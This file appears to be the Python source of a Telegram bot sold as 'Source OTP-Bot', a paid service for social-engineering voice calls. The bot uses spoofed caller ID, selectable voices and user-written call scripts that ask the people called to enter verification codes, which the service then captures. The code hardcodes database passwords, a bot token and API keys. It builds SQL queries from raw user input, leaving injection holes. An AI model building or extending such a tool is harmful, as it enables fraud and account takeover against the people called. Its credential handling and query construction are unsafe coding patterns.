import mysql.connector
from mysql.connector import errorcode
import flask
from datetime import *
from flask import Flask, session
from flask import Flask, Response, request, url_for
import requests
import time
import telebot
from flask import Flask, request
from telebot import types
from config import *
import json
from telegram import InputFile
import threading
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
import subprocess
import os
from flask_cors import CORS
from flask import Flask, jsonify



ngul=[]

d_user ='doadmin'
d_host ='db-mysql-nyc3-63189-do-user-16074184-0.c.db.ondigitalocean.com'
d_pass ='AVNS__XpkKv7cE-wgggkbbRy'
d_port =25060
d_data='otbbotdatabase'


time.sleep(1)
response = requests.get('http://localhost:4040/api/tunnels')
data = response.json()
ng_url = data['tunnels'][0]['public_url']
ngul.append(ng_url)
  


ngrok_url= ngul[0]   # NGROK APP LINK HERE
bot_tkn ='7383376915:AAEzhKfgLnEejoyEQc8jEfF0I54BT7Jo5EM'  # YOUR BOT API bot_tkn HERE
apiKey = '9bf6642c-6d37-472f-b430-da6e72e483e1'
apiKey2 = "57wbs19H2d20290A0292Ha92k3hdeinqunj"
last_message_ids = {}

updater = Updater(token=bot_tkn, use_context=True)
dispatcher = updater.dispatcher

try:
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
except mysql.connector.Error as err:
     if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
          print("Something is wrong with your user name or password")
     elif err.errno == errorcode.ER_BAD_DB_ERROR:
          print("Database does not exists")
     else:
          print(err)
else:



#curser database
  c = db.cursor()
  
# Flask connection
app = Flask(__name__)
CORS(app)
# Bot connection
bot = telebot.TeleBot(bot_tkn, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=ngrok_url)

#--------------------------------------------------------------------------

# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)


# Handle '/start' -----------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
  global last_message_ids
     #Database connect------------------------
  db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
  c = db.cursor()
   #_____________________________________
  userid = message.from_user.id
  print(userid)
  c.execute(f"SELECT * FROM users WHERE user_id={userid}")
  row= c.fetchone()
  # Check whether the user already registered in our system
  if (row)!= None:
    if row[3]!='ban':
      if user_day_check(userid)==0:
        delete_data(userid)
        bot.send_message(message.from_user.id, f"*You have expired key*",  parse_mode='Markdown')
        send_welcome(message)
      elif user_day_check(userid)>0:
        
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item3 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
        item9 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
        keyboard.add(item3)
        keyboard.add(item7,item4)
        keyboard.add(item9,item6)
        keyboard.add(item8)

        mes3 = bot.send_photo(chat_id=message.from_user.id, caption=f"🌐 Hello <b>{name}</b> Welcome To The Source OTP - BOT.\n👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇", reply_markup=keyboard, parse_mode='HTML',photo=open('starting_photp.jpg', 'rb')).message_id
        last_message_ids[message.from_user.id] = mes3
        
    else:
       name = message.from_user.first_name
       bot.send_message(message.from_user.id, f"*Sorry {name} ,you are banned from using this service.\nContact @shadow_hiddenx for more info.*",parse_mode='markdown')
  
  elif (row)== None:

    name = message.from_user.first_name
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    item1 = types.InlineKeyboardButton(text="Purchase Token💵", callback_data="/price")
    item2 = types.InlineKeyboardButton(text="Redeem  Token🔑", callback_data="/redeem")
    item3 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
    item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
    item5 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
    item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
    item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
    item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
    keyboard.add(item1)
    keyboard.add(item2, item4)
    keyboard.add(item5,item3)
    keyboard.add(item7,item6)
    keyboard.add(item8)
    mes2 = bot.send_photo(message.from_user.id,caption=f"""
🌟 Welcome to Source OTP-Bot! 🌟

👋 Hello, <b>{name}</b> Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:

<b>🔐 Top-Tier Security:</b>

• 📲Seamlessly integrate with various systems using our pre-built modules.

• 🔍Present any caller ID you need with custom caller ID/spoofing.

• 🤖Detect humans and robots to ensure you're always speaking to the right entity.

<b>🧬 Advanced Functionalities:</b>

• 💻Tailor-made custom scripts to meet your unique requirements.

• 🌐Connect globally without boundaries using international calling.

• ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.

<b>🤝 User-Friendly Controls:</b>

• ✅Instant control at your fingertips with accept/deny buttons.

• 🔄Easily manage and recall sessions using the recall button and command.


👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇""",parse_mode='HTML',reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
    last_message_ids[message.from_user.id] = mes2
  
  c.close()
  print("Connection Closed")

@bot.message_handler(commands=['price'])
def Price_list(message):
    try:
        global last_message_ids
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        item1 = types.InlineKeyboardButton(text="Back", callback_data='/backstart')
        keyboard.add(item1)
        bot.edit_message_caption(f"""
1.   <b>Basic Plan:</b>
   • 💵 Price: 24 USD
   • 💹 Value: 2,000 INR
   • 🗓 Validity: 1 Day

2.   <b>Standard Plan:</b>
   • 💵 Price: 55 USD
   • 💹 Value: 4,500 INR
   • 🗓 Validity: 3 Days

3.   <b>Premium Plan:</b>
   • 💵 Price: 100 USD
   • 💹 Value: 8,300 INR
   • 🗓 Validity: 7 Days

4.  <b>Ultimate Plan:</b>
   • 💵 Price: 260 USD
   • 💹 Value: 22,000 INR
   • 🗓 Validity: 30 Days

<i>Contact @Shadow_hiddenx to purchase your token 🎟️</i>
""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
        print("Price Error")
        send_welcome(message)

@bot.message_handler(commands=['commands'])
def Commands(message):
    try:
        global last_message_ids
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")
        keyboard.add(item1)
        bot.edit_message_caption(f"""
<b>• Command List:</b> 💬

<b><i>🧑‍💻 Basis Commands: ⬇️</i></b>

/profile - Check Your Profile👤
/purchase - Buy key 🗝️
/redeem - Redeem your Key 🔐
/price - Check current Price 💵

<b><i>🧑‍💻 Calling Commands: ⬇️</i></b>

/call - Any Pre Build Module Calls📱
/customcall - Custom Script Calls 📞
/recall - Repeat Your Last Call 🤙
/endcall - Hangup any ongoing call ✂️

<b><i>🧑‍💻 Script Commands: ⬇️</i></b>

/customscript - To View All Script 🆔
/createscript - To Make A Script ✍️
/deletescript - To Delete Old Script ♠️
/viewscript   - To View perticular Script⌛️

<b><i>🧑‍💻 Function Commands: ⬇️</i></b>

/vmenable: Activate machine & human detection 💻
/vmdisable: Disable machine & human detection 🛠️           
                                       
""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         send_welcome(message)

@bot.message_handler(commands=['community'])
def community(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()  
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="Dev 🧑‍💻", url='https://t.me/dynamic_up')
        item2 = types.InlineKeyboardButton(text="Owner 🧑", url='https://t.me/Shadow_hiddenx')
        item3 = types.InlineKeyboardButton(text="Discussion💪", url='https://t.me/source_otp_bot_discussion')
        item6 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/source_otp_bot_channel')
        item4 = types.InlineKeyboardButton(text="Vouches 🔢", url='https://t.me/sourcebotvouches')
        
        if cdata!=None:
            item5 = types.InlineKeyboardButton(text="Back 🔙", callback_data="/activatedstartback")
        else:
             item5 = types.InlineKeyboardButton(text="Back 🔙", callback_data="/backstart")
        keyboard.add(item6)
        keyboard.add(item4,item3)
        keyboard.add(item1,item2)
        keyboard.add(item5)
        bot.edit_message_caption(f"Join the emarging community :-",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
    except:
         send_welcome(message)



def Start_back(message):
    try:
        global last_message_ids
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="Purchase Token 💵", callback_data="/price")
        item2 = types.InlineKeyboardButton(text="Redeem  Token 🔑", callback_data="/redeem")
        item3 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
        item5 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
        item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
        keyboard.add(item1)
        keyboard.add(item2, item4)
        keyboard.add(item5,item3)
        keyboard.add(item7,item6)
        keyboard.add(item8)
        bot.edit_message_caption(chat_id=message.from_user.id,caption=f"""
🌟 Welcome to Source OTP-Bot! 🌟

👋 Hello, <b>{name}</b> Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:

<b>🔐 Top-Tier Security:</b>

• 📲Seamlessly integrate with various systems using our pre-built modules.

• 🔍Present any caller ID you need with custom caller ID/spoofing.

• 🤖Detect humans and robots to ensure you're always speaking to the right entity.

<b>🧬 Advanced Functionalities:</b>

• 💻Tailor-made custom scripts to meet your unique requirements.

• 🌐Connect globally without boundaries using international calling.

• ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.

<b>🤝 User-Friendly Controls:</b>

• ✅Instant control at your fingertips with accept/deny buttons.

• 🔄Easily manage and recall sessions using the recall button and command.


👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇""",parse_mode="HTML", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
    except:
         send_welcome(message)

@bot.message_handler(commands=['vmenable'])
def vnenable(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    try:
        c.execute(f"Update users set amd='True' where user_id={message.from_user.id}")
        db.commit()
        bot.send_message(message.from_user.id, f"*Activated machine & human detection 💻*",parse_mode='markdown')
    except:
        bot.send_message(message.from_user.id, f"*You don't have any access.*",parse_mode='markdown')


@bot.message_handler(commands=['vmdisable'])
def vmdisable(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    try:
        c.execute(f"Update users set amd='False' where user_id={message.from_user.id}")
        db.commit()
        bot.send_message(message.from_user.id, f"*Disabled machine & human detection 🛠️*",parse_mode='markdown')
    except:
        bot.send_message(message.from_user.id, f"*You don't have any access.*",parse_mode='markdown')



def activatedstartback(message):      
        global last_message_ids
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        
        item3 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
        item9 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
        keyboard.add(item3)
        keyboard.add(item7,item4)
        keyboard.add(item9,item6)
        keyboard.add(item8)
        mes3 = bot.edit_message_caption(chat_id=message.from_user.id, caption=f"🌐 Hello <b>{name}</b> Welcome To The Source OTP - BOT.\n👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇", reply_markup=keyboard,message_id=last_message_ids[message.from_user.id], parse_mode='HTML',).message_id
        last_message_ids[message.from_user.id] = mes3

def Features(message):
    try:
        global last_message_ids
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""
🚀 <b><i>Source OTP Bot:</i></b> Your Supreme Two-Factor Authentication & OTP Service 

<b>Here is our feature list:</b>

• Ready-to-Use Modules: ✅
• Custom Caller ID/Spoofing: 📞
• Wide Variety of Voice Choices : 🗣️
• High Uptime (99%) : ⏰
• Lightning-Fast Response : ⚡️
• Tailored Scripts :  📝
• No OTP Capture Issues : 🔒
• Accept/Deny Buttons : ✔️❌
• 24/7 Customer Support:  🕒👤
• Special Add-ons Available 🌟
• Digit Detection 🔢
""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         print("Error in features")
         send_welcome(message)

def Support(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""*
📲 𝙎𝙤𝙪𝙧𝙘𝙚 OTP Bot 📲

🆘 Need Assistance or Have Questions? Our support team is here to help:

✉️ Contact:
👑 Owner: @Shadow_hiddenx
💻 Dev  : @dynamic_up
                                 
✨ Join our Telegram server for support and discussions:
🌐 @source_otp_bot_discussion
*""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
    except:
         send_welcome(message)


def Privacy(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""
Certainly!

<b><i>💸 Key Redemption: Non-Refundable 💸</i></b>

😀 Once you've claimed a purchased key, it's a done deal – no refunds. We understand life's twists and turns, but for fairness, this policy applies universally, even to our longtime patrons.

<b><i>Why the Firm Policy? 😀</i></b>
Think of it like purchasing a concert ticket – once the music starts, there's no turning back. Similarly, once a key is utilized, it cannot be resold.

<b><i>⌚️ Act Promptly for Add-ons! ⌚️</i></b>
Should you encounter any issues with your add-on, don't hesitate to contact the admin immediately! There's a specific timeframe for resolution. Missing the deadline, unfortunately, limits our capacity to assist.

<b><i>The Bottom Line 😀</i></b>
Ensure your certainty before purchasing and claiming a key. These guidelines exist for the benefit of all, with no exceptions.
Your comprehension is appreciated!
""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         send_welcome(message)
     


#----------------------------------------------------------------------------------------------------

@bot.message_handler(commands=['validity'])
def current_credit(message):
   #Database connect------------------------
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor() 
   #_____________________________________
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          limit =cdata[2]
          days=user_day_check(id)
          if days>=1:
            bot.send_message(message.from_user.id,f"*Your Current key is limited to {limit - datetime.today()} *",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*❌ Key Expired*""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
   c.close() 
#----------------------------PROFILE-------------------------------------------------------------------------------------
      
@bot.message_handler(commands=['profile'])
def Profile_def(message):
    try:
        global last_message_ids

        #Database connect------------------------
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor() 
        #_____________________________________
        id = message.from_user.id
        name = message.from_user.first_name
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        if cdata!=None:
            if cdata[3]!='ban':
                days=user_day_check(id)
                if days>=1:
                    try:
                        keyboard = types.InlineKeyboardMarkup(row_width=2)
                        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/activatedstartback")
                        keyboard.add(item1)
                        bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
Chat 🆔 {id} 
Name:- {name}
Status:- Active ✅
Validity:- {cdata[2]} ⌛
Call count:- {cdata[10]}
Otp count:- {cdata[9]} 📞                              
        *""",parse_mode='markdown',reply_markup=keyboard)
                    except:
                        send_welcome(message)
                elif days==0:
                        keyboard = types.InlineKeyboardMarkup(row_width=2)
                        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/activatedstartback")
                        keyboard.add(item1)   
                        bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
Chat 🆔:- {id} 
Name:- {name}
Status:- Expired ✅
Validity:- {cdata[2]}⌛
Call count:- {cdata[10]}
Otp count:- {cdata[9]} 📞*""",parse_mode='markdown',reply_markup=keyboard)
                        delete_data(id) 
            else:
                bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
        else:
            bot.send_message(message.from_user.id,f"""*❌ Redeem key to activate.*""",parse_mode='markdown')
        c.close()
    except:
         send_welcome(message)
#-------------------------------------------Redeem --------------------------------------------------------------------------------
@bot.message_handler(commands=['redeem'])
def redeem_user(message):
    send = bot.send_message(message.from_user.id, "*- - -Send your Token - - -*",parse_mode='markdown')
    bot.register_next_step_handler(send,redeem_done) 

def redeem_done(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    reedem_code=str(message.text)
    c.execute(F"SELECT * FROM users WHERE user_id={id}")
    dat=c.fetchone()
    if dat!=None:
        if user_day_check(id)==0:
            c.execute(f"Delete from users where user_id={id}")
            db.commit()
            uresp=redeem_key(reedem_code,id)
            if uresp==1:
                days=user_day_check(id)
            elif uresp==0:
                bot.send_message(message.from_user.id, f"*Invalid Token*",parse_mode='markdown')
        elif user_day_check(id)>0:
            bot.send_message(message.from_user.id, f"*An Activation Token is Already Activated*",parse_mode='markdown')
    elif dat==None:
        uresp=redeem_key(reedem_code,id)
        if uresp==1:
            time.sleep(3)
            days=user_day_check(id)
            bot.send_message(message.from_user.id, f"*Token redeemed successfully✅*",parse_mode='markdown')
            send_welcome(message)
        elif uresp==0:
            bot.send_message(message.from_user.id, f"*Invalid Token*",parse_mode='markdown')
    c.close()
#--------------------------------------------------------------------------------------------------------------------------- 
    
#------------------------------------------------------------------------------------------------------------------------------

def Voices(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="🇮🇳 Indian", callback_data="/ind")
        item0 = types.InlineKeyboardButton(text="🇺🇸 American", callback_data="/us")
        item2 = types.InlineKeyboardButton(text="🇮🇹 Italian", callback_data="/itl")
        item3 = types.InlineKeyboardButton(text="🇫🇷 French", callback_data="/frn")
        if cdata!=None:
            item4 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item4 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")


        keyboard.add(item1,item0)
        keyboard.add(item3, item2)
        keyboard.add(item4)
        bot.edit_message_caption(chat_id=message.from_user.id,caption="Available voices are:",message_id=last_message_ids[message.from_user.id],reply_markup=keyboard).message_id
    except:
         send_welcome(message)

#---------------------------------CUSTOM SCRIPT-----------------------------------------------------------------------------
@bot.message_handler(commands=['customscript'])
def Set_custom(message):
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          days=user_day_check(id)
          if days>=1:
              try :
                  c.execute(f"select * from custom_scripts where  user_id={id}")
                  all_sc = c.fetchall()    
                  txt=''
                  for i in (all_sc):
                      namee = i[2]
                      scr_id  = i[1]
                      txt = txt + f'{namee}:{scr_id}\n'
                  bot.send_message(id,f"*All Scripts\n{txt}*",parse_mode='markdown')
              except:
                      bot.send_message(id,f"*Create any Script.*",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*❌ Key Expired*""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""* ❌Redeem key to activate *""",parse_mode='markdown')
   c.close() 
   

def First_Script_name(message):
             global last_message_ids
             id = message.from_user.id
             namesc=message.text
             print(namesc)
             c.execute(f"UPDATE custom_scripts SET script_name='{namesc}' WHERE script_id={last_message_ids[message.from_user.id]}")
             db.commit()
             send2 =bot.send_message(message.chat.id, "*Send Part One Of Script:\nNote:- Where You Can Say For {Press One}*",parse_mode='markdown')
             bot.register_next_step_handler(send2,First)
     

def First(message):
             global last_message_ids
             id = message.from_user.id
             script1=message.text
             print(script1)
             c.execute(f"UPDATE custom_scripts SET intro='{script1}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send2 =bot.send_message(message.chat.id, "*Send Part Two Of Script:\nNote:- Where You Can Say For {Dail The Verification Code}*",parse_mode='markdown')
             bot.register_next_step_handler(send2,Second)

def Second(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET otp='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "*Send Part Three Of Script:-\nNote:- Where You Can Say For {Checking The Code}*",parse_mode='markdown')
             bot.register_next_step_handler(send3,Third)
             
def Third(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET waiting='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "*Send Part Four Of Script:\nNote:- Where You Can Say {Code Was Code Rejected}*",parse_mode='markdown')
             bot.register_next_step_handler(send3,Fourth)


def Fourth(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET wrong='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "*Send Part Five Of Script:-\nNote:- Where You Can Say For {Your Code Was Accpeted}*",parse_mode='markdown')
             bot.register_next_step_handler(send3,Fifth)

def Fifth(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET last='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "*Send the OTP Digita you want to capture.*",parse_mode='markdown')
             bot.register_next_step_handler(send3,OTP_DIGITS)
def OTP_DIGITS(message):
             id = message.from_user.id
             scp2=int(message.text)
             c.execute(f"UPDATE custom_scripts SET digits={scp2} WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             bot.send_message(message.chat.id, f"Script Saved \nScript ID : <code>{last_message_ids[message.from_user.id]}<code>",parse_mode='HTML')
             

@bot.message_handler(commands=['createscript'])
def Set_custom_script(message):
   global last_message_ids
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          days=user_day_check(id)
          if days>=1:
              
                  id = message.from_user.id
                  script_id= genrandom()
                  c.execute(f"Insert into custom_scripts value({id},{script_id},'xx','xx','xx','xx','xx','xx',6)")
                  db.commit()

                  last_message_ids[message.from_user.id]=script_id
                  print(last_message_ids[message.from_user.id])
                  send1 = bot.send_message(id,f"*Enter Script Name : *",parse_mode='markdown')
                  bot.register_next_step_handler(send1,First_Script_name)
            #   except :
            #       bot.send_message(id,f"*Enter correct format *",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*❌ Key Expired*""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
   c.close() 

@bot.message_handler(commands=['deletescript'])
def Set_custom_script(message):
    try:
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        script_id =(message.text[13:]).split()
        print(script_id)
        c.execute(f"delete from custom_scripts where script_id={script_id[0]} and user_id={id}")
        db.commit()
        bot.send_message(id,f"*Your Script deleted*",parse_mode='markdown')
    except :
        bot.send_message(id,f"*Enter correct format /deletescript <script id> *",parse_mode='markdown')
    c.close()

@bot.message_handler(commands=['viewscript'])
def Set_custogrem_script(message):
    try:
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        script_id =(message.text[11:]).split()
        c.execute(f"Select * from custom_scripts where script_id={script_id[0]} ")
        result = c.fetchone()
        bot.send_message(id,f"Script 🆔 {script_id}:\n\n1.{result[3]}\n\n2.{result[4]}\n\n3.{result[5]}\n\n4.{result[6]}\n\n5.{result[7]}\n\nDigits{result[8]}",parse_mode='markdown')
    except :
        bot.send_message(id,f"*Enter correct format /viewscript <script id>\nWrong Script ID *",parse_mode='markdown')
    c.close()
#----------------------------------------------------------------------------------------------------------------------
 

#------------------------------------------------------------------------------------------------------------------
def recordingtexis(recname):
    url = 'http://162.33.178.184:3001/v1/rec'
    headers = {

        'Content-Type': 'application/json',
    }
    data = {

        "apikey": f'{apiKey2}',
        "recname": f'{recname}',

    }
    response = requests.post(url, headers=headers, json=data)
    record_url = response.json()['url']
    return record_url


@bot.message_handler(commands=['endcall']) #Manual
def callhangupmanual(message):
        
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"Select * from api_key where id=123")
    apidata= c.fetchone()
    c.execute(f"Select * from call_data where chat_id={message.from_user.id}")
    custom_cont = c.fetchone()
    call_control  = custom_cont[1]


    if apidata[1]==1:
        urlh = 'https://ai2api.com/v1/api/hangup'
        data = {
    "uuid": f"{call_control}",
}
        requests.post(urlh, json=data)       
    elif apidata[1]==2:
         urlht =  "http://162.33.178.184:3001/v1/hangup"
         data = {
    "uuid": f"{call_control}",
    "apikey":f"{apiKey2}"
}
         resp=requests.post(urlht, json=data)
         print(resp.text)
    c.close()



def callhangup(chatid:int):
        
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"Select * from api_key where id=123")
    apidata= c.fetchone()
    print(chatid)
    c.execute(f"Select * from call_data where chat_id={chatid}")
    custom_cont = c.fetchone()
    call_control  = custom_cont[1]


    if apidata[1]==1:
        urlh = 'https://ai2api.com/v1/api/hangup'
        data = {
    "uuid": f"{call_control}",
}
        requests.post(urlh, json=data)       
    elif apidata[1]==2:
         urlht =  "http://162.33.178.184:3001/v1/hangup"
         data = {
    "uuid": f"{call_control}",
    "apikey":f"{apiKey2}"
}
         resp = requests.post(urlht, json=data)
         print(resp.text)
    c.close()



def callhangbutton(userid):  
    bot.send_message(userid, f"*Phone Ringing 📳\nHangup ongoing call - /endcall*",  parse_mode='markdown')


